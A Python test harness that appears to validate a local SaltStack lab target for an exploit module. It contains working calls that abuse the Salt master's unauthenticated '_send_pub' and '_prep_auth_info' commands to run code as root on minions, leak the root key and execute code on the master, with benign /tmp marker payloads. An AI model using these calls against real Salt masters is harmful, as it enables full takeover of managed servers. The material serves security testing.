import datetime,hashlib,json,os
from pathlib import Path
import ssl
import shlex
import time

import salt
import pkg_resources
import salt.client
import salt.config
import salt.key
import salt.payload
import salt.transport.client
import salt.version
import zmq

configuration=json.load(__import__('sys').stdin)
state=json.loads(Path('/var/run/salt/module-target.json').read_text())
record={'status':'starting','salt':salt.version.__version__,'libzmq':zmq.zmq_version(),'ssl':ssl.OPENSSL_VERSION,'roles':state['roles'],'calls':[]}
expected={'module-target-minion-a','module-target-minion-b'}
options=salt.config.minion_config('/etc/salt/minion');options['master_uri']='tcp://127.0.0.1:4506'
def send(load):
 with salt.transport.client.ReqChannel.factory(options,crypt='clear') as channel:return channel.send(load,timeout=10,tries=1)
def command(client,tgt,fun,arg=None,**kwargs):
 start=time.monotonic();reply=client.cmd(tgt,fun,arg=arg or [],timeout=10,**kwargs);record['calls'].append({'tgt':tgt,'fun':fun,'arg':arg or [],'kwargs':kwargs,'reply':reply,'seconds':time.monotonic()-start});return reply

def publication(case,tgt,roles,kind,bg):
 prefix='/tmp/native-rce-'+case
 for role in ['minion-a','minion-b']:assert not Path(prefix+'-'+role+'.json').exists()
 code='import json,os; role=os.environ["MSF_MODULE_TARGET_ROLE"]; path='+repr(prefix)+'+"-"+role+".json"; tmp=path+".writing"; open(tmp,"w").write(json.dumps({"role":role,"token":os.environ.get("MSF_MODULE_TARGET_TOKEN"),"pid":os.getpid()})); os.replace(tmp,path)'
 jid=datetime.datetime.utcnow().strftime('%Y%m%d%H%M%S%f')
 load={'cmd':'_send_pub','user':'root','tgt':tgt,'tgt_type':'pcre','jid':jid,'kwargs':{'bg':bg,'hide_output':True,'ignore_retcode':True,'output_loglevel':'quiet','show_jid':False,'show_timeout':False}}
 if kind=='python':load.update(fun='cmd.exec_code',arg=['python',code])
 else:load.update(fun='cmd.run',arg=['python -c '+shlex.quote(code)])
 started=time.monotonic();reply=send(load);entry={'case':case,'tgt':tgt,'kind':kind,'bg':bg,'jid':jid,'reply':reply,'proofs':{}}
 record.setdefault('publications',[]).append(entry)
 deadline=time.monotonic()+(20 if roles else 2)
 while time.monotonic()<deadline:
  found={role:Path(prefix+'-'+role+'.json') for role in ['minion-a','minion-b'] if Path(prefix+'-'+role+'.json').exists()}
  if roles and set(found)==set(roles):break
  time.sleep(.1)
 for role in ['minion-a','minion-b']:
  marker=Path(prefix+'-'+role+'.json')
  if marker.exists():
   proof=json.loads(marker.read_text());assert proof['role']==role and proof['token']==state['roles'][role]['token'];entry['proofs'][role]=proof;marker.unlink()
 entry['seconds']=time.monotonic()-started;entry['passed']=set(entry['proofs'])==set(roles)
 return entry['passed']

try:
 assert record['salt']==configuration['version']
 installed=Path(salt.__file__).parent.parent
 record['vendor_files']={name:hashlib.sha256((installed/name).read_bytes()).hexdigest() for name in configuration['vendor_files']}
 assert record['vendor_files']==configuration['vendor_files']
 record['packages']={name:pkg_resources.get_distribution(name).version for name in configuration['packages']}
 assert record['packages']==configuration['packages']
 record['fixture_files']={name:hashlib.sha256(Path(name).read_bytes()).hexdigest() for name in configuration['fixture_files']}
 assert record['fixture_files']==configuration['fixture_files']
 masteropts=salt.config.master_config('/etc/salt/master')
 client=salt.client.get_local_client('/etc/salt/master')
 deadline=time.monotonic()+100
 while time.monotonic()<deadline:
  ready=command(client,'module-target-minion-*','test.ping')
  if set(ready)==expected and all(ready.values()):break
  time.sleep(.5)
 else:raise RuntimeError('Genuine minions did not become responsive')
 keys=salt.key.Key(masteropts).list_keys();record['keys']=keys;assert set(keys['minions'])==expected;assert not keys['minions_pre'] and not keys['minions_rejected'] and not keys['minions_denied']
 role_values=command(client,'module-target-minion-*','environ.get',['MSF_MODULE_TARGET_ROLE'])
 assert role_values=={'module-target-minion-a':'minion-a','module-target-minion-b':'minion-b'},role_values
 token_values=command(client,'module-target-minion-*','environ.get',['MSF_MODULE_TARGET_TOKEN'])
 for identifier,token in token_values.items():assert token==state['roles'][identifier[len('module-target-'):]]['token']
 assert command(client,'^module-target-minion-a$','test.ping',tgt_type='pcre')=={'module-target-minion-a':True}
 assert command(client,'^module-target-missing$','test.ping',tgt_type='pcre')=={}
 assert command(client,'module-target-minion-*','cmd.run',['printf native-minion-command'])=={name:'native-minion-command' for name in expected}
 key=Path('/var/cache/salt/master/.root_key').read_text().strip();record['root_key_sha256']=hashlib.sha256(key.encode()).hexdigest()
 disclosure=send({'cmd':'_prep_auth_info'});assert disclosure[2]['root']==key;assert sorted(disclosure[2])==['bin','daemon','nobody','root'];record['auth_info_bytes']=len(salt.payload.Serial(options).dumps(disclosure))
 marker=Path('/tmp/native-rce-master.json');assert not marker.exists()
 code='import os,json; open('+repr(str(marker))+',"w").write(json.dumps({"role":os.environ.get("MSF_MODULE_TARGET_ROLE"),"token":os.environ.get("MSF_MODULE_TARGET_TOKEN"),"pid":os.getpid()}))'
 load={'cmd':'runner','fun':'salt.cmd','user':'root','kwarg':{'fun':'cmd.exec_code','lang':'python','code':code}}
 denied=send(dict(load,key='module-target-invalid-root-key'));assert denied['error']['name']=='UserAuthenticationError';assert not marker.exists();record['invalid_root_reply']=denied
 accepted=send(dict(load,key=key));record['accepted_root_reply']=accepted;assert 'error' not in accepted
 deadline=time.monotonic()+40
 while time.monotonic()<deadline and not marker.exists():time.sleep(.2)
 proof=json.loads(marker.read_text());record['master_execution']=proof;assert proof['role']=='master' and proof['token']==state['roles']['master']['token'];marker.unlink()
 record['processes']={}
 for role,details in state['roles'].items():
  proc=Path('/proc')/str(details['pid']);record['processes'][role]={'command':(proc/'cmdline').read_bytes().replace(b'\0',b' ').decode(),'starttime':(proc/'stat').read_text().split(') ',1)[1].split()[19],'config_sha256':hashlib.sha256(Path(details['config']).read_bytes()).hexdigest()}
 results=[
  publication('shell-single','^module-target-minion-a$',['minion-a'],'command',True),
  publication('shell-all','^module-target-minion-[ab]$',['minion-a','minion-b'],'command',True),
  publication('python-all-bg','^module-target-minion-[ab]$',['minion-a','minion-b'],'python',True),
  publication('python-all-fg','^module-target-minion-[ab]$',['minion-a','minion-b'],'python',False),
  publication('missing','^module-target-missing$',[],'command',True)
 ]
 record['publication_calibration_passed']=all(results)
 record['cgroups']={name:Path('/sys/fs/cgroup',name).read_text() for name in ['memory.events','pids.events','memory.max','memory.swap.max','cpu.max']}
 for name in ['memory.events','pids.events']:assert all(int(line.split()[1])==0 for line in record['cgroups'][name].splitlines())
 record['status']='native_passed' if all(results) else 'native_publication_calibration_failed'
 assert all(results),'Native publication calibration failed'
finally:
 print('SALT_NATIVE_RECORD='+json.dumps(record,sort_keys=True))
